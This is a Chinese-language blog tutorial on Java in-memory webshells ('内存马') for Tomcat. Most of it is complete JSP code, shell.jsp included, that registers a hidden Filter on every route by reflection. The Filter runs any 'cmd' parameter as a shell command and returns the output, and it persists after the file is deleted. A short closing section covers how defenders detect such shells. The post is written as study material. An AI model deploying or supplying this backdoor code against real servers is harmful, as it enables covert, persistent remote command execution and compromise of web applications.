# Java内存马初探（一）




## 简介

内存马主要分为以下几类：

1. servlet-api类

- - filter型
- - servlet型

1. spring类

- - 拦截器
- - controller型

1. Java Instrumentation类

- - agent型





（第一次学习，先以Filter的分析为主），这种类型的内存马，就是在Filter过滤器上做了点手脚。

**Filter称为过滤器**，是Servlet2.3新增的一种技术，同时也是Servlet技术中最实用的技术。通过Filter技术，可以实现对所有Web资源的管理，如实现权限访问控制、过滤敏感词汇、压缩响应信息等。

**Filter过滤器实现流程：**每当客户端请求servlet的时候，都会经过过滤器，而过滤器在实战项目中，通常用来进行一些session的校验等。统一设置编码格式，敏感字符过滤等

![image-20220111231303670](http://image.xpshuai.cn/img/image-20220111231303670.png)



Filter中有个`doFilter方法`，当开发人员写Filter的拦截逻辑，并配置对哪个web资源进行拦截后，web服务器就会在**每次调用web资源的service()方法之前先调用`doFilter()`方法**

过滤器先接收到请求，然后再转发给Servlet，然后Servlet走了之后又回到过滤器中再之后doFilter之后的内容

> 详细的Filter的知识请翻看有关文章，本文不再细讲





## 实现流程



### 0x01 新建Maven项目

引入servlet包啥的

```xml
    <dependencies>
        <!--Servlet依赖-->
        <dependency>
            <groupId>javax.servlet</groupId>
            <artifactId>javax.servlet-api</artifactId>
            <version>4.0.1</version>
            <scope>provided</scope>
        </dependency>

        <!--JSP依赖-->
        <dependency>
            <groupId>javax.servlet.jsp</groupId>
            <artifactId>jsp-api</artifactId>
            <version>2.2</version>
            <scope>provided</scope>
        </dependency>
    </dependencies>
```





### 0x02 一个Tomcat Filter简单案例

**新建filter：**

```java
import javax.servlet.*;
import java.io.IOException;

public class MyFilter implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
        System.out.println("Filter 创建");
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        System.out.println("执行过滤过程");
        filterChain.doFilter(servletRequest, servletResponse);
    }

    @Override
    public void destroy() {
        System.out.println("销毁了！");
    }
}

```

**web.xml:**

```xml
<!DOCTYPE web-app PUBLIC
 "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
 "http://java.sun.com/dtd/web-app_2_3.dtd" >

<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">

  <display-name>Archetype Created Web Application</display-name>

<!--  我们创建一个servlet和一个filter 访问路由都是为/test-->
  <servlet>
    <servlet-name>HelloServlet</servlet-name>
    <servlet-class>TestServlet</servlet-class>
  </servlet>
  <servlet-mapping>
    <servlet-name>HelloServlet</servlet-name>
    <url-pattern>/test</url-pattern>
  </servlet-mapping>

  <filter>
    <filter-name>testFilter</filter-name>
    <filter-class>MyFilter</filter-class>
  </filter>
  <filter-mapping>
    <filter-name>testFilter</filter-name>
    <url-pattern>/test</url-pattern>
  </filter-mapping>

</web-app>


```

对应Web.xml中的配置信息，这种方式就是为静态的添加filter的方式，filter实现分为静态和动态，静态就是上述中，普通配置在web.xml或者通过@注释配置在类中的。



### 0x03 一个简单Filter内存马案例

1. 首先创建一个恶意Filter
2. 利用 FilterDef 对 Filter 进行一个封装
3. 将 FilterDef 添加到 FilterDefs 和 FilterConfig
4. 创建 FilterMap ，将我们的 Filter 和 urlpattern 相对应，存放到 filterMaps中（由于 Filter 生效会有一个先后顺序，所以我们一般都是放在最前面，让我们的 Filter 最先触发）

```java
    ServletContext servletContext = request.getSession().getServletContext();
    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
        // ApplicationContext 为 ServletContext 的实现类
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
        // 这样我们就获取到了 context 
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

```



#### 1.首先来编写一个filter的恶意类

在`doFilter`方法中写下实现的功能



![实现](http://image.xpshuai.cn/img/image-20220111233418103.png)

![实现2](http://image.xpshuai.cn/img/image-20220111233531426.png)



代码如下：

```java
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.util.Scanner" %>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>

<%
    final String name = "xps";
    ServletContext servletContext = request.getSession().getServletContext();

    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

    Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
    Configs.setAccessible(true);
    Map filterConfigs = (Map) Configs.get(standardContext);

    if (filterConfigs.get(name) == null){
        Filter filter = new Filter() {
            @Override
            public void init(FilterConfig filterConfig) throws ServletException {

            }

            @Override
            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                //这里写上我们后门的主要代码
                HttpServletRequest req = (HttpServletRequest) servletRequest;
                if (req.getParameter("cmd") != null){

                    InputStream in = Runtime.getRuntime().exec(req.getParameter("cmd")).getInputStream();
//
                    Scanner s = new Scanner(in).useDelimiter("\\A");
                    String output = s.hasNext() ? s.next() : "";
                    servletResponse.getWriter().write(output);

                    return;
                }
                filterChain.doFilter(servletRequest,servletResponse);
            }

            @Override
            public void destroy() {

            }

        };


        FilterDef filterDef = new FilterDef();
        filterDef.setFilter(filter);
        filterDef.setFilterName(name);
        filterDef.setFilterClass(filter.getClass().getName());

        // 将filterDef添加到filterDefs中
        standardContext.addFilterDef(filterDef);

        FilterMap filterMap = new FilterMap();
        //拦截的路由规则，/* 表示拦截任意路由
        filterMap.addURLPattern("/*");
        filterMap.setFilterName(name);
        filterMap.setDispatcher(DispatcherType.REQUEST.name());

        standardContext.addFilterMapBefore(filterMap);

        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
        constructor.setAccessible(true);
        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);

        filterConfigs.put(name,filterConfig);
        out.print("注入成功");
    }
%>

```

web.xml同上

```xml
<!DOCTYPE web-app PUBLIC
 "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
 "http://java.sun.com/dtd/web-app_2_3.dtd" >

<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">

  <display-name>Archetype Created Web Application</display-name>

<!--  我们创建一个servlet和一个filter 访问路由都是为/test-->
  <servlet>
    <servlet-name>HelloServlet</servlet-name>
    <servlet-class>TestServlet</servlet-class>
  </servlet>
  <servlet-mapping>
    <servlet-name>HelloServlet</servlet-name>
    <url-pattern>/test</url-pattern>
  </servlet-mapping>

  <filter>
    <filter-name>testFilter</filter-name>
    <filter-class>MyFilter</filter-class>
  </filter>
  <filter-mapping>
    <filter-name>testFilter</filter-name>
    <url-pattern>/test</url-pattern>
  </filter-mapping>

</web-app>





```



#### 2.运行

![image-20220112093849052](http://image.xpshuai.cn/img/image-20220112093849052.png)

可以看到这个就是在tomcat中没有任何shell文件，但是在过滤器中执行了我们的代码。



### 0x04 实战真正内存马

首先得明白一点，在实战环境下，你不可能写一个Filter对象然后又放到对方的代码中，这样子不就早getshell了，而且就算修改了，想要生效也需要重启。**所以我们需要找到一个注入点，动态的在内存中插入filter对象，这样才叫做一个真正的内存马了**，那我们该如何操作呢？



#### 知识点1：ServletContext

web应用启动的时候，都会产生一个ServletContext为接口的对象，因为在web中这个ServletContext对象的一些数据能够保证Servlets稳定运行。

那么该对象如何获得？

在tomcat容器中中ServletContext的实现类是ApplicationContext类

在web应用中，获取的ServletContext实际上是ApplicationContextFacade的对象，对ApplicationContext进行了封装，而ApplicationContext实例中又包含了StandardContext实例，所以说我们在tomcat中拿到StandardContext则是去获取ApplicationContextFacade这个对象。

> 看完我也是懵懵的...



#### 知识点2：组装Filters的流程

> 要调试Tomcat的话，需要注意的记得把tomcat下的lib文件导入到idea工程中，要不然idea在调试的时候是找不到的！



#### 知识点3：FilterConfig









#### 最终代码

如下：shell.jsp

```jsp
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>

<%
	// 1.获取当前应用的ServletContext对象(这里是反射获取ApplicationContext的context，也就是standardContext)
    final String name = "xps";
    ServletContext servletContext = request.getSession().getServletContext();

    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
	// 2.再获取filterConfigs
    Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
    Configs.setAccessible(true);
    Map filterConfigs = (Map) Configs.get(standardContext);
	// 3.接着实现自定义想要注入的filter对象
    if (filterConfigs.get(name) == null){
        Filter filter = new Filter() {
            @Override
            public void init(FilterConfig filterConfig) throws ServletException {

            }

            @Override
            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                
        //这里是后门的主要代码  
        HttpServletRequest req = (HttpServletRequest) request;
        if (req.getParameter("cmd") != null) {
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"sh", "-c", req.getParameter("cmd")} : new String[]{"cmd.exe", "/c", req.getParameter("cmd")};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\a");
            String output = s.hasNext() ? s.next() : "";
            response.getWriter().write(output);
            response.getWriter().flush();
        }
            //别忘记带这个，不然的话其他的过滤器可能无法使用
        	chain.doFilter(request, response);
   			 }
         }

            @Override
            public void destroy() {

            }

        };

		//4.然后为自定义对象的filter创建一个FilterDef
        FilterDef filterDef = new FilterDef();
        filterDef.setFilter(filter);
        filterDef.setFilterName(name);
        filterDef.setFilterClass(filter.getClass().getName());
        
        // 将filterDef添加到filterDefs中
        standardContext.addFilterDef(filterDef);

        FilterMap filterMap = new FilterMap();
      //拦截的路由规则，/* 表示拦截任意路由，这里优先级调到最高
        filterMap.addURLPattern("/*");
        filterMap.setFilterName(name);
        filterMap.setDispatcher(DispatcherType.REQUEST.name());

        standardContext.addFilterMapBefore(filterMap);
		//5.最后把 ServletContext对象 filter对象 FilterDef全部都设置到filterConfigs即可完成内存马的实现
        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
        constructor.setAccessible(true);
        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);

        filterConfigs.put(name,filterConfig);
        out.print("内存马注入成功");
    }
%>

```



访问这个页面：

![访问](http://image.xpshuai.cn/img/image-20220112101704180.png)



最后直接访问任意Servlet路由都可以执行命令：



![success](http://image.xpshuai.cn/img/image-20220112152447867.png)





**即使删除我们的注入文件`shell.jsp`也是一样可以执行，这样就可以达到无文件的Webshell管理方式了。**





参考文章：

[深入浅出内存马（一） - 风炫安全 - 博客园 (cnblogs.com)](https://www.cnblogs.com/fxsec/p/15000570.html)

[Java Filter型内存马的学习与实践 - zpchcbd - 博客园 (cnblogs.com)](https://www.cnblogs.com/zpchcbd/p/14814385.html)

[一文看懂内存马 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/274466.html)

https://mp.weixin.qq.com/s/RnqoUuQ78NTG6VfkDbGPBA





## 内存马排查

```bash
如果是jsp注入，日志中排查可疑jsp的访问请求。

如果是代码执行漏洞，排查中间件的error.log，查看是否有可疑的报错，判断注入时间和方法

根据业务使用的组件排查是否可能存在java代码执行漏洞以及是否存在过webshell，排查框架漏洞，反序列化漏洞。

如果是servlet或者spring的controller类型，根据上报的webshell的url查找日志（日志可能被关闭，不一定有），根据url最早访问时间确定被注入时间。

如果是filter或者listener类型，可能会有较多的404但是带有参数的请求，或者大量请求不同url但带有相同的参数，或者页面并不存在但返回200
```

参考这篇：https://gv7.me/articles/2020/kill-java-web-filter-memshell/







## 参考文章：

[查杀Java web filter型内存马 | 回忆飘如雪 (gv7.me)](https://gv7.me/articles/2020/kill-java-web-filter-memshell/)

[SpringBoot Controller 内存马 / yso定制 - zpchcbd - 博客园 (cnblogs.com)](https://www.cnblogs.com/zpchcbd/p/15544419.html)

[SpringBoot Interceptor 内存马 - zpchcbd - 博客园 (cnblogs.com)](https://www.cnblogs.com/zpchcbd/p/15545773.html)

[Java Filter型内存马的学习与实践 - zpchcbd - 博客园 (cnblogs.com)](https://www.cnblogs.com/zpchcbd/p/14814385.html)



Java还是学的太菜了，未完待续，以后学的更深入了继续来深耕......


---

> 作者: [剑胆琴心](http://geoer.cn)  
> URL: https://shuai06.github.io/java%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%9D%E6%8E%A2/  

